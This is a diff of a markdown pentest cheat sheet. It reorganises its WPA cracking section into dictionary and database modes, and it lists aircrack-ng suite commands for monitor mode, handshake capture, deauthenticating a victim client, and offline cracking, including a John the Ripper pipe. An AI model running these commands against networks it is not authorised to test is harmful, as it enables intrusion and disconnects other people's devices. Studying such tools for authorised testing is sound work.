@@ -78,19 +78,24 @@ aircrack-ng <.CAP FILENAME>
 airmon-ng start <INTERFACE> <channel>
 airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
 aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
+```
+
+##### Dictionary mode
+
+```
 aircrack-ng -w <WORDLIST> <.CAP FILENAME>
+```
+
+##### Database mode
+
+```
+aircrack-ng -r <DB NAME> <.CAP FILENAME>
 ```
 
 #### Cracking WPA with John the Ripper (JTR)
 
 ```
 ./john --wordlist=<WORDLIST> --rules --stdout | aircrack-ng -e <ESSID> -w - <.CAP FILENAME>
-```
-
-#### Cracking WPA with Airolib-ng
-
-```
-aircrack-ng -r <DB NAME> <.CAP FILENAME>
 ```
 
 #### Cracking WPA with CoWPAtty
